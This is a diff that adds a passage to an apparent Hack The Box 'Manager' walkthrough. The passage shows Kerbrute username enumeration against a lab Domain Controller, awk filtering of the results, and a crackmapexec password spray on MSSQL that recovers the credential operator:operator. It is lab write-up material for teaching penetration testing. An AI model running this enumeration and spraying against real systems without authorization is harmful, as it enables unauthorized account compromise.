@@ -263,3 +263,80 @@ PORT      STATE SERVICE       REASON          VERSION
 49767/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
 ```
 
+It appears that we are working with a Domain Controller based on the existence of DNS, Kerberos and LDAP.
+
+Given that we are not provided credentials, let's test for usernames using Kerbrute, like so:
+
+#### Download Kerbrute:
+
+```
+wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
+```
+
+#### Run Kerbrute:
+
+```
+./kerbrute_linux_amd64 userenum -d manager.htb --dc 10.129.116.131 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+```
+
+#### Results:
+
+```
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 10/25/26 - Ronnie Flathers @ropnop
+
+2026/10/25 08:53:49 >  Using KDC(s):
+2026/10/25 08:53:49 >  	10.129.116.131:88
+
+2026/10/25 08:53:51 >  [+] VALID USERNAME:	 ryan@manager.htb
+2026/10/25 08:53:53 >  [+] VALID USERNAME:	 guest@manager.htb
+2026/10/25 08:53:55 >  [+] VALID USERNAME:	 cheng@manager.htb
+2026/10/25 08:53:56 >  [+] VALID USERNAME:	 raven@manager.htb
+2026/10/25 08:54:02 >  [+] VALID USERNAME:	 administrator@manager.htb
+2026/10/25 08:54:17 >  [+] VALID USERNAME:	 Ryan@manager.htb
+2026/10/25 08:54:19 >  [+] VALID USERNAME:	 Raven@manager.htb
+2026/10/25 08:54:26 >  [+] VALID USERNAME:	 operator@manager.htb
+2026/10/25 08:55:24 >  [+] VALID USERNAME:	 Guest@manager.htb
+2026/10/25 08:55:24 >  [+] VALID USERNAME:	 Administrator@manager.htb
+2026/10/25 08:56:10 >  [+] VALID USERNAME:	 Cheng@manager.htb
+2026/10/25 08:58:26 >  [+] VALID USERNAME:	 jinwoo@manager.htb
+2026/10/25 08:58:48 >  [+] VALID USERNAME:	 RYAN@manager.htb
+2026/10/25 09:00:08 >  [+] VALID USERNAME:	 RAVEN@manager.htb
+2026/10/25 09:00:12 >  [+] VALID USERNAME:	 GUEST@manager.htb
+2026/10/25 09:02:18 >  [+] VALID USERNAME:	 Operator@manager.htb
+```
+
+Paste these into a file and run the following commands to sort them:
+
+```
+awk -F 'USERNAME:[[:space:]]*' '{print $2}' usernames.txt | cut -d @ -f 1 | grep '^[a-z]*$' > cut_users.txt
+```
+
+#### cut_users.txt:
+
+```
+ryan
+guest
+cheng
+raven
+administrator
+operator
+jinwoo
+```
+
+Let's try our credentials against the MSSQL server:
+
+```
+crackmapexec mssql 10.129.116.131 -u cut_users.txt -p cut_users.txt --continue-on-success | grep +
+```
+
+#### Output:
+
+```
+MSSQL                    10.129.116.131  1433   DC01             [+] manager.htb\operator:operator 
+```
